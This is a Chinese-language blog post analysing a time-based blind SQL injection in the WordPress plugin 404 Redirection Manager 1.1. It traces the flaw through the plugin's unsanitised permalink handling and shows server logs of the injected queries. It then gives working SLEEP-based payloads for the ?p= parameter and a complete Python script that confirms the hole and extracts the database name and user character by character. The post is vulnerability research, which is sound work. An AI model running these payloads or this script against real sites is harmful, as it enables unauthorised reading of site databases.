---
layout: post
title: WordPress插件:404 Redirection Manager 1.1 SQL注入
categories: [漏洞分析]
tags: [WordPress,SQL Injection]
fullview: false
comments: true
---
插件更新至1.0版本更新至1.1版本，发现注入问题依旧，自己挖了一下。目前官方已经移除了该插件，下面是我保存到本地的[漏洞样本](http://o8lgx56x1.bkt.clouddn.com/sample/code/404-redirection-manager.zip)

首先说下搭建的测试环境:

服务器：Apache，数据库：MySQL 5.7.15，WordPress版本：4.3.6。

先做准备工作，在docker上部署的这个WordPress默认的链接形式是这样的：

<code>http://monburan-wordpress-test.daoapp.io/2016/12/22/sample-post/</code>

这里要将WordPress的链接设置成默认的，像这样：

<code>http://monburan-wordpress-test.daoapp.io/?p=123</code>

首先看下前面提到1.0版本的poc：

<pre><code>monburan-monburan-wordpress.daoapp.io/?p=5') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL</code></pre>

‘字面上’的注入很好理解，利用<code>sleep()</code>进行延时注入，当<code>'a'='a'</code>结果为<code>True</code>，则取0，<code>5-0=5</code>，执行<code>sleep(5)</code>。

我觉得还可以精简一下:

<pre><code>monburan-monburan-wordpress.daoapp.io/?p=5')AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL</code></pre>

为了更好的分析这个漏洞产生的过程，我插入了一条可以触发数据库错误的语句
<code>') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'</code>（这里多了一个<code>'</code>）。

借助后台日志，我尝试着找到了这段注入执行的语句。

<pre><code> [Sat Dec 24 14:42:56.429172 2016] [:error] [pid 166] [client 10.10.73.77:1174] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex='' and (redirect_from='/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'' or redirect_from='/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' ) \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82</code></pre>

<pre><code>[Sat Dec 24 14:42:56.430187 2016] [:error] [pid 166] [client 10.10.73.77:1174] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'' regexp regex or '/?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' regexp regex ) order by LENGTH(regex) desc \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=5') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL'/' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82</code></pre>

有了这些，就可以方便在源码中发现问题所在，下面是引入注入的代码：

![sqli-code-1](http://o8lgx56x1.bkt.clouddn.com/blog/img/wp-404-plugin-sqlicode-1.png)

$wpdb是WordPress 数据库访问抽象对象，get_row()是WordPress中一个执行数据库查询并返回结果的函数，也就是说这里同时执行了两条语句

拿其中一个问题来说来说，这里的SQL语句是这样的：

<pre><code>select * from $table_name where enabled=1 and cat='link' and blog='" . get_current_blog_id() . "' and regex<>'' and $permalink_regex_options order by LENGTH(regex) desc </code></pre>

<code>get_current_blog_id()</code>是WordPress中检索ID值的函数，注入的问题明显不是从这里引入的，后面还有一个变量<code>$permalink_regex_options</code>，所以继续跟进。

![sqli-code-2](http://o8lgx56x1.bkt.clouddn.com//blog/img/wp-404-plugin-sqlicode-2.png)

顺着<code>$permalink_regex_options</code>找到了<code>$permalink</code>和<code>$permalink_alternative</code> 两个变量，这两个变量的的值指向了两个函数

![sqli-code-3](http://o8lgx56x1.bkt.clouddn.com//blog/img/wp-404-plugin-sqlicode-3.png)

![sqli-code-4](http://o8lgx56x1.bkt.clouddn.com//blog/img/wp-404-plugin-sqlicode-4.png)

可以看到在<code>get_permalink</code>中在对url进行编码后，并没有做任何对url中参数的过滤，而是继续将url中的参数部分提取出来传入一个sanitize()的函数中，一路追下去可以看到这个sanitize()函数中也没有对注入有关的参数进行过滤。

![sqli-code-5](http://o8lgx56x1.bkt.clouddn.com//blog/img/wp-404-plugin-sqlicode-5.png)

以上，代码中的问题看完，现在整理出完整在数据库中执行的语句：

<pre><code>select * from wordpress_db.wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex or '/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex ) order by LENGTH(regex) desc</code></pre>

<pre><code>select * from wordpress_db.wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex='' and ('/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex or '/?p=1') AND (SELECT * FROM (SELECT(IF('a'='a',sleep(5),0)))abc) AND ('SQL'='SQL' regexp regex ) order by LENGTH(regex) desc</code></pre>

可以发现，这里<code>sleep</code>执行了两次，所以一条SQL执行的时间应该在10秒以上。

从数据库上跑一下，成功了，时间也没问题。

![sqli-sql](http://o8lgx56x1.bkt.clouddn.com//blog/img/wp-404-plugin-sqlicode-sql.png)

从前面报错的请求来看，这里每次访问都会使插件执行两次查询，所以在利用的时候要选一个合适的时间。

在确认这个漏洞后第一时间想到的是如何利用，这种基于时间的盲注通常是用爆破的方式获取数据。然后就写了个脚本跑一下(仅测试数据库名和用户名)。

<pre>
<code>
# -*- coding:utf-8 -*-
import requests
import urllib
import string
import time


def time_compare(sleep_time, sqli_time):

    if sqli_time - sleep_time * 4 >= 0:
        return True
    else:
        return False


def test(poc, sleep_time):
    # print "Test Poc:{}".format(poc)

        sqli_rsp = requests.get(poc)
        sqli_time = sqli_rsp.elapsed.seconds

        return time_compare(sleep_time, sqli_time)


def using_char():
    char = string.ascii_lowercase + string.ascii_uppercase
    char += string.digits
    char += '@'
    return char


def databaselenght(url, sleep_time,):

    poc = "') AND (SELECT * FROM (SELECT(IF(LENGTH("
    poc += "database())={},SLEEP({}),0)))abc) AND ('SQL'='SQL"
    for i in range(1, 64):
        time.sleep(5)
        db_poc = url + urllib.quote(poc.format(str(i), str(sleep_time)))
        if test(poc=db_poc, sleep_time=sleep_time):
            print "Database Name Lenght:{}".format(i)
            Lenght = i
            break
    return Lenght


def getdatabase(url, sleep_time, db_lenght):

    poc = "') AND (SELECT * FROM (SELECT(IF(ascii(substr"
    poc += "((select database()),{},1))={},SLEEP({}),0)))abc)"
    poc += " AND ('SQL'='SQL"

    name_list = []
    char = using_char() + '_'
    for i in range(1, db_lenght + 1):
        for c in char:
            time.sleep(5)
            c = ord(c)
            db_poc = url + urllib.quote(poc.format(i, c, str(sleep_time)))
            if test(poc=db_poc, sleep_time=sleep_time):
                name_list.append(chr(c))
                break
        database_name = "".join(name_list)
        print database_name


def userlenght(url, sleep_time):
    poc = "') AND (SELECT * FROM (SELECT(IF(LENGTH("
    poc += "user())={},SLEEP({}),0)))abc) AND ('SQL'='SQL"
    for i in range(1, 64):
        time.sleep(2)
        user_poc = url + urllib.quote(poc.format(str(i), str(sleep_time)))
        if test(user_poc, sleep_time):
            print "User Name Lenght:{}".format(i)
            Lenght = i + 1
            break
    return Lenght


def getuser(url, sleep_time, user_lenght):

    poc = "') AND (SELECT * FROM (SELECT(IF(user()"
    poc += " like '{}%',sleep(2),0)))abc)"
    poc += " AND ('SQL'='SQL"
    test_char = ""
    name_list = []
    char = using_char()
    for i in range(1, user_lenght):
        for c in char:
            time.sleep(5)
            usr_poc = url + urllib.quote(poc.format(test_char + c, str(sleep_time)))
            if test(poc=usr_poc, sleep_time=sleep_time):
                test_char += c
                name_list.append(c)

                break
        user_name = "".join(name_list)
        print user_name


def main():
    """
    WordPress插件:404 Redirection Manager 1.1 SQL注入
                    start test!
    """
    sleep_time = 5
    url = 'http://monburan-monburan-wordpress.daoapp.io/?p=1'
    poc = "') AND (SELECT * FROM (SELECT(IF('a'='a'"
    poc += ",sleep({}),0)))abc) AND ('SQL'='SQL"
    poc = url + urllib.quote(poc.format(str(sleep_time)))

    if test(poc=poc, sleep_time=sleep_time):
        print "{} have sqlinject.".format(url)
        db_lenght = databaselenght(url, sleep_time)
        getdatabase(url, sleep_time, db_lenght)
        user_lenght = userlenght(url, sleep_time)
        getuser(url, sleep_time, user_lenght)


if __name__ == '__main__':
    print main.__doc__
    main()

</code>
</pre>




